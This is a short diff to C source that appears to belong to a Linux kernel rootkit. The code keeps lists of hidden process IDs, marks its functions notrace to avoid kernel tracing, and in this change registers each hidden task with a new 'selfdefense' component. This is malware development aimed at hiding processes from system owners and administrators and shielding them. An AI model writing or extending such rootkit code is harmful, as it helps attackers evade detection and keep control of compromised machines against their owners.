@@ -1,5 +1,6 @@
 #include "../include/core.h"
 #include "../include/hidden_pids.h"
+#include "../include/selfdefense.h"
 
 int child_pids[MAX_HIDDEN_PIDS*128];
 int hidden_pids[MAX_HIDDEN_PIDS];
@@ -137,6 +138,7 @@ notrace void add_hidden_pid(int pid) {
     int i;
     struct task_struct *task;
     struct task_struct *leader;
+    struct task_struct *task_ref = NULL;
     u64 start_time_ns = 0;
 
     if (pid <= 0)
@@ -149,6 +151,8 @@ notrace void add_hidden_pid(int pid) {
         if (!leader)
             leader = task;
         start_time_ns = READ_ONCE(leader->start_time);
+        get_task_struct(task);
+        task_ref = task;
     }
     rcu_read_unlock();
 
@@ -167,6 +171,11 @@ notrace void add_hidden_pid(int pid) {
     }
 out:
     spin_unlock_irqrestore(&hidden_pids_lock, flags);
+
+    if (task_ref) {
+        sd_register_hidden_task(task_ref);
+        put_task_struct(task_ref);
+    }
 }
 
 notrace int is_hidden_pid(int pid) {
